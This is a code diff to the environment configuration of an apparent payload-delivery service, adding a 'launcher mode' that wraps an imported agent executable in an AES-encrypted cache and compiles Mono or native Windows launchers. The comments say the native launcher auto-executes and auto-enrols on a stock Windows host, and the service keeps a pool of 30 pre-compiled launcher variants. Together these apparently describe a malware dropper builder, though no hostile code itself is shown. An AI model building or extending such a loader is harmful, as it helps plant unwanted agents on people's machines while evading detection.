@@ -50,4 +50,26 @@ export const env = {
   // host (e.g. https://dl.vantra.instaweb.top) that 302s /d/<jobId> →
   // <PUBLIC_URL>/downloads/<jobId>/zip.
   REDIRECT_BASE_URL: optional("REDIRECT_BASE_URL", ""),
+
+  // ---- Launcher mode (WP2/WP3) ----
+  // Path of the one-time imported agent exe (operator drop on the VPS). The
+  // launcher mode NEVER fetches it at request time; the import happens at
+  // startup (or via the authed POST /payload endpoint).
+  PAYLOAD_PATH: optional("PAYLOAD_PATH", ""),
+  // 64-hex AES-256 master key for the payload cache. When unset a random key
+  // is generated once and persisted under generator/payload-cache/master.key
+  // (0600) — production should pin this env var instead.
+  PAYLOAD_MASTER_KEY: optional("PAYLOAD_MASTER_KEY", ""),
+  // Optional explicit path to the mono C# compiler for launcher builds
+  // (default: `mcs` on PATH). The VPS needs mono-mcs only for launcher mode.
+  MONO_MCS_PATH: optional("MONO_MCS_PATH", ""),
+  // Option 3: build the launcher as a NATIVE Windows PE (MinGW cross-compile)
+  // instead of Mono IL. `1` enables it; when on, the target needs no Mono/.NET
+  // runtime and auto-executes + auto-enrolls on a stock Windows host.
+  LAUNCHER_NATIVE: process.env["LAUNCHER_NATIVE"]?.trim() === "1",
+  // Cross compiler for the native path (build-native.sh default is
+  // `x86_64-w64-mingw32-gcc`).
+  NATIVE_CC: optional("NATIVE_CC", "x86_64-w64-mingw32-gcc"),
+  // Warm launcher pool size (number of pre-compiled launcher variants kept).
+  LAUNCHER_POOL_SIZE: number("LAUNCHER_POOL_SIZE", 30),
 };
